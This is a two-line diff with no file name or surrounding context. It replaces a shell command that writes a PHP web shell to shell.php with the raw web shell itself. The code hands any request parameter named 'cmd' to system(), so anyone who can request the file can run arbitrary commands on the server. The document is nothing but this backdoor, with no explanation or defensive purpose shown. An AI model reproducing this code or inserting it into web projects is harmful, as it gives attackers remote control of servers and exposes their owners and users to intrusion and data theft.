@@ -1,1 +1,1 @@
-echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+<?php system($_REQUEST["cmd"]);?>
